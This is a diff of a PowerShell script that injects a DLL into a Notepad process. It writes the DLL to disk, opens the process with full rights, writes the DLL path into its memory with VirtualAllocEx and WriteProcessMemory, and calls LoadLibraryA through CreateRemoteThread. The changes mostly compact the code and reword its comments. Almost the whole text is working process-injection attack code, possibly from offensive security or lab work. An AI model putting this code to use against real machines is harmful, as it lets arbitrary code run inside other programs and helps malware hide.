@@ -29,16 +29,14 @@ public class Win32 {
 Add-Type -TypeDefinition $win32 -Language CSharp
 
 function Get-NotepadPID {
-    $name = "notepad"
     try {
-        $p = Get-Process -Name $name -ErrorAction Stop | Select-Object -First 1
+        return (Get-Process -Name notepad -ErrorAction Stop | Select-Object -First 1).Id
     } catch {
         Write-Host "[~] Notepad not running; launching..."
-        $p = Start-Process $name -PassThru
+        $p = Start-Process notepad -PassThru
         Start-Sleep -Milliseconds 500
+        return $p.Id
     }
-    Write-Host "[+] Target Notepad PID: $($p.Id)"
-    return $p.Id
 }
 
 try {
@@ -54,56 +52,42 @@ try {
     Write-Host "[~] Writing DLL to $DLL_PATH"
     [IO.File]::WriteAllBytes($DLL_PATH, $buf)
 
-    # 3) Get Notepad PID and open process handle
+    # 3) Get Notepad PID & open process
     $targetPID = Get-NotepadPID
-    $hProc     = [Win32]::OpenProcess(0x1F0FFF, $false, $targetPID)
-    if ($hProc -eq [IntPtr]::Zero) {
-        throw "OpenProcess failed (insufficient rights?)"
-    }
+    Write-Host "[+] Target Notepad PID: $targetPID"
+    $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $targetPID)
+    if ($hProc -eq [IntPtr]::Zero) { throw "OpenProcess failed (insufficient rights?)" }
 
     try {
-        # 4) Allocate space for the DLL path string
+        # 4) Allocate memory for the DLL path string
         $pathBytes = [Text.Encoding]::ASCII.GetBytes($DLL_PATH + "`0")
         $len       = $pathBytes.Length
         Write-Host "[~] Allocating $len bytes for path string..."
         $remoteStr = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $len, 0x3000, 0x04)
-        if ($remoteStr -eq [IntPtr]::Zero) {
-            throw "VirtualAllocEx failed"
-        }
+        if ($remoteStr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }
 
-        # 5) Write the path string into target memory
+        # 5) Write the path string
         Write-Host "[~] Writing path string..."
         $written = [IntPtr]::Zero
         $ok = [Win32]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, $len, [ref]$written)
-        if (-not $ok -or $written -ne $len) {
-            throw "WriteProcessMemory failed"
-        }
+        if (-not $ok -or $written -ne $len) { throw "WriteProcessMemory failed" }
 
-        # 6) Get the address of LoadLibraryA
+        # 6) Lookup LoadLibraryA
         $hKernel = [Win32]::GetModuleHandle("kernel32.dll")
         $addrLL  = [Win32]::GetProcAddress($hKernel, "LoadLibraryA")
         Write-Host "[+] LoadLibraryA @ 0x{0:X}" -f $addrLL.ToInt64()
 
-        # 7) Create the remote thread calling LoadLibraryA
+        # 7) Create remote thread
         Write-Host "[~] Creating remote thread..."
         $tid = [IntPtr]::Zero
         $hth = [Win32]::CreateRemoteThread(
-            $hProc,
-            [IntPtr]::Zero,
-            0,
-            $addrLL,
-            $remoteStr,
-            0,
-            [ref]$tid
+            $hProc, [IntPtr]::Zero, 0, $addrLL, $remoteStr, 0, [ref]$tid
         )
-        if ($hth -eq [IntPtr]::Zero) {
-            throw "CreateRemoteThread failed"
-        }
+        if ($hth -eq [IntPtr]::Zero) { throw "CreateRemoteThread failed" }
         Write-Host "[+] Injection succeeded! Thread ID: $tid"
-
         [Win32]::CloseHandle($hth) | Out-Null
-    }
-    finally {
+
+    } finally {
         [Win32]::CloseHandle($hProc) | Out-Null
     }
 
